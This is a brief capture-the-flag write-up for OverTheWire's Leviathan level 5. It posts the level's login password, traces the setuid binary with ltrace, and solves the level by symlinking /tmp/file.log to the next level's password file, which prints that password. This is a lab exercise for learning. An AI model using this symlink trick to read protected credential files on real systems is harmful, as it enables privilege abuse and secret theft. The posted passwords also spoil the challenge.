Challenge page is <a href="http://www.overthewire.org/wargames/leviathan/leviathan5.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 5

There is no information for this level.
If you would like to see the description of this level expanded, please consider to contribute to OTW!
CHALLENGE_CONTENT

Login
	Username: leviathan5
	Password: Tith4cokei

Comment by me:
	- Try executing ~/leviathan5

	leviathan5@melissa:~$ ./leviathan5 
	Cannot find /tmp/file.log
	
	leviathan5@melissa:~$ ltrace ./leviathan5 
	__libc_start_main(0x8048584, 1, -10236, 0x8048630, 0x8048690 <unfinished ...>
	fopen("/tmp/file.log", "r")                                  = 0
	puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
	)                            = 26
	exit(-1 <unfinished ...>
	+++ exited (status 255) +++
	leviathan5@melissa:~$ 

	- So it basically, needs a file /tmp/file.log to read. We can create a symlink file at that location to point to the file containing password for next level.

	leviathan5@melissa:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
	leviathan5@melissa:~$ ./leviathan5 
	UgaoFee4li